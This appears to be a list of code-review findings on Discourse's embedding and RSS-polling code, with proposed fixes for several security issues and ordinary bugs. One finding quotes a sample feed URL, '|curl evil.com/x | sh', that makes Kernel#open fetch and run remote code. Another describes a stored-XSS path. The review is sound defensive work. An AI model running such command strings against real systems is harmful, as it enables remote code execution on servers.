findings.title: postMessage targetOrigin should be origin only, not referer URL
findings.body: The `postMessage` call uses `'<%= request.referer %>'` as the `targetOrigin` argument. `targetOrigin` should be a serialized origin (scheme + host + port) or `*`. Passing the full referer URL works in browsers because they parse the string down to its origin, but the correct and safe value is explicitly the origin. Worse, when `request.referer` is nil/empty (which `ensure_embeddable` allows when there is no Referer header), the rendered value becomes `parent.postMessage(..., '')`. An empty string is treated as `"*"` by browsers, causing the resize message to be sent to any window that has registered a `message` listener — a small but real information leak (the Discourse iframe's pixel height to any opener/parent). Render the referer's origin (e.g. `"#{URI(request.referer || '').scheme}://#{URI(request.referer || '').host}"`) and bail out (or send `null` height) when referer is missing.

findings.title: Kernel#open on user-controlled URL allows command execution
findings.body: `rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)` invokes `Kernel#open` on the configured feed URL. Ruby's `Kernel.open` treats a leading `|` as a subshell command, so an admin who pastes or copy-pastes a URL like `|curl evil.com/x | sh` (or `|something`) into `feed_polling_url` will execute it as the Ruby process (which is the Rails/web process — typically the Discourse user, often with access to the DB and `Rails.env` secrets). Later versions of Discourse explicitly replace `Kernel.open` and `OpenURI.open_uri` everywhere this pattern appears for exactly this reason. Use `URI.open(SiteSetting.feed_polling_url)` (OpenURI) or an explicit HTTP client, with a redirect/host allowlist and size/time limits, instead of `Kernel.open`.

findings.title: raw_html cook_method bypasses sanitization, enabling stored XSS
findings.body: In `Post#cook`, when `cook_method == Post.cook_methods[:raw_html]` the method returns `raw` verbatim, skipping `post_analyzer.cook(*args)` which is what normally runs sanitization (whitelisted image classes, host-aware link rewriting, etc.). The `TopicEmbed.import` flow (called from `TopicEmbed.import_remote` → `ruby-readability`, and from `Jobs::PollFeed` over fetched RSS items) creates these posts with `cook_method: Post.cook_methods[:raw_html]` and stores the upstream raw HTML as `raw`. Any HTML/JS present in the trusted-but-compromised source (a hijacked blog post, a malicious RSS entry, etc.) is therefore rendered to every visitor of the embed iframe, and because `best.html.erb` renders with `<%= raw post.cook %>`, nothing in the rendering path will scrub it. This is stored XSS inside the Discourse origin. At minimum, the `raw_html` branch must run the same sanitizer `cook` applies for regular posts (e.g. `PostAnalyzer.new(raw, topic_id).cook`), or, better, the cook_method selector should reject generic HTML and only accept a constrained subset.

findings.title: Script throws if #discourse-comments is not present
findings.body: `var comments = document.getElementById('discourse-comments')` is dereferenced at `comments.appendChild(iframe)` without a null check. If a third-party site embeds the script before the `#discourse-comments` div exists (wrong placement, dynamic page where the div hasn't been rendered yet, etc.), the script crashes on the `null.appendChild(...)` call and the rest of the IIFE — including the `postMessage` listener — never runs, so the embed silently fails and the iframe can never self-resize. Guard the append: `if (comments) { comments.appendChild(iframe); } else { document.body.appendChild(iframe); }`.

findings.title: absolutize_urls corrupts protocol-relative URLs
findings.body: `absolutize_urls` only absolutizes `href`/`src` values that `start_with?('/')`. Protocol-relative URLs like `//cdn.example.com/img.jpg` match that check but then `href.sub(/^\/+/, '')` strips every leading slash, so a value that is supposed to point at `https://cdn.example.com/img.jpg` is rewritten into `https://example.comcdn.example.com/img.jpg`. The link appears to be a same-origin resource, which is both broken (the image fails to load) and a small URL-confusion issue because the rendered URL points at the embed host. Detect protocol-relative inputs explicitly: `a['href'] = href.sub(/^\/+/, '/') if href.start_with?('//')` (keep the leading `//`) and append to `prefix` instead of inserting a literal slash.

findings.title: i.content may be nil and blows up on .scrub
findings.body: `content = CGI.unescapeHTML(i.content.scrub)` assumes `i.content` is non-nil. Not every RSS/Atom item carries a `content` field — some provide only `description` or `summary`, in which case `SimpleRSS#content` returns `nil` and `nil.scrub` raises `NoMethodError`. A single malformed feed entry aborts the entire hourly poll job for the rest of the items in the batch and may surface in error reports. Use `i.content.presence || i.description.to_s` (or wrap in a guard) so missing content yields an empty string instead of an exception.

findings.title: TTL is set only on the racing process; throttle window is effectively unbounded
findings.body: `retrieved_recently?` uses `SETNX` followed by `EXPIRE 60`. Between the `SETNX` and the `EXPIRE`, the key has no TTL — if the process dies in that gap (Sidekiq worker killed, VM paused) the key persists forever with the value `"1"`, and every subsequent attempt to retrieve that same embed URL will be silently throttled indefinitely because `invalid_host?` is the only other gate and the throttle check returns `true` first. Move the TTL into a single atomic call: `$redis.set(retrieved_key, '1', nx: true, ex: 60)` so the key is always created with its expiration. Additionally, the inverse race exists: two workers can both pass `retrieved_recently?` returning false simultaneously before either `SETNX` runs, and both will go on to call `TopicEmbed.import_remote` — the unique index on `topic_embeds.embed_url` is the only thing protecting against the double-import, and `TopicEmbed.import` calls `PostCreator.create` with side effects (notifications, draft sequence, message_bus publish) that aren't rolled back by the unique-index failure. These two issues combined mean the throttle provides at most a 60-second fence, not a deduplication guarantee, despite the name.

findings.title: perform_retrieve runs the entire RSS poll synchronously inside a single embed import
findings.body: `TopicRetriever#perform_retrieve` does `Jobs::PollFeed.new.execute({})` whenever feed polling is enabled. That job imports every item in the entire RSS feed in a single call — fetching and cooking N remote pages even when this retriever only cares about one specific `embed_url`. For a feed with dozens of entries the embedding request stalls for minutes, blocking the Sidekiq worker, and on every cached re-fetch the whole feed is re-iterated. Filter inside `poll_feed` (or split it into two methods, one keyed by URL) so the synchronous embed path only fetches the requested entry.

findings.title: Stale/unrelated require_dependency 'email/sender'
findings.body: `require_dependency 'email/sender'` is added at the top of the RetrieveTopic job but the job does not use the `Email::Sender` class (or anything else from the email stack) anywhere in this file. It appears to be a copy/paste leftover from another job. Keeping it loads the email autoload subtree unnecessarily on every Sidekiq run of this class and confuses readers searching for the dependency chain.
